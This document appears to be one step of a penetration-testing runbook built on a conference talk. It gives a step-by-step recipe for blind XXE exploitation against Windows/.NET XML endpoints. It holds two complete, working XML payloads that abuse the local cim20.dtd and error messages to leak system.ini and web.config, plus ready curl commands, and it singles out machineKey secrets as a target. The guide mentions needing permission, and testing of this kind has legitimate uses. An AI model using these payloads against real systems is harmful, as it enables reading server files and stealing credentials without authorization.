# Batch 06 — Blind XXE + partial file leak (talk payloads)

## FILL IN

```bash
# XML URL of the app — change me
XML_URL="https://TARGET/api/xml-endpoint"
# save payloads to files then:
# curl -sk -X POST "$XML_URL" -H "Content-Type: application/xml" --data-binary @payload.xml
```

## GOAL
No outbound HTTP, but stack traces ON → leak file pieces via **local DTD** + **`#` fragment** (talk slides 23–28).

## TIME
~1 hour

## YOU NEED
- An endpoint that parses XML  
- Error messages / stack traces visible  
- Permission to test  

---

## WHY (kid version) — talk constraints

You cannot:

- See the file in a normal happy response  
- Load your evil DTD over HTTP  

You can:

- Use a **DTD already on Windows**  
- Force an **error** that prints part of the file  
- Put file bytes after `#` so .NET shows them in the error (**@nytr0gen_** trick)

---

## DO THIS

### 1) Prove XML errors exist

Send broken XML. Confirm you get a **stack trace**, not a blank 500.

### 2) Attempt 1 — local DTD + system.ini (exact talk idea)

Save as `xxe-attempt1.xml`:

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///C:/Windows/System32/wbem/xml/cim20.dtd">
  <!ENTITY % SuperClass '>
    <!ENTITY &#x25; file SYSTEM "file:///c:/windows/system.ini">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<message>any text</message>
```

```bash
curl -sk -X POST "$XML_URL" -H "Content-Type: application/xml" --data-binary @xxe-attempt1.xml
```

**Win:** any text from `system.ini` in the error.  

**Talk “Stack Trace But No Love”:** you may only see:

```text
System.Xml.XmlException: An error occurred while parsing EntityName
```

…with **no file data**. That is expected. Go to attempt 2 (add `#`).

XXE payload ideas bank (slide): https://bit.ly/3cF8pWs  
Local DTD article (slide): https://bit.ly/2LjXoyM

### 3) Attempt 2 — add `#` fragment for partial web.config (talk win)

Save as `xxe-attempt2.xml` (path may need changing):

```xml
<?xml version="1.0" ?>
<!DOCTYPE doc [
  <!ENTITY % local_dtd SYSTEM "file:///C:/Windows/System32/wbem/xml/cim20.dtd">
  <!ENTITY % SuperClass '>
    <!ENTITY &#x25; file SYSTEM "file:///C:/inetpub/wwwroot/web.config">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/#&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ENTITY test "test">
  '>
  %local_dtd;
]>
<xxx>test</xxx>
```

Also try talk-style Windows path for the file to read:

```text
file:///D:/webserv2/services/web.config
```

```bash
curl -sk -X POST "$XML_URL" -H "Content-Type: application/xml" --data-binary @xxe-attempt2.xml
```

**Win:** partial `web.config` / keys in the error → go batch **04**.

### 4) Write 3 lines

```text
Stack traces: yes/no
Partial file: yes/no
Keys: yes/no
```

---

## IF / THEN

| You see | You do |
|---------|--------|
| Keys / machineKey | → **04** |
| No stack traces | Stop XXE → **07** |
| Only DNS OOB works | Report limited XXE |

---

## NEXT
→ [07-shortname-fuzz.md](./07-shortname-fuzz.md)

**Slides:** 23–28
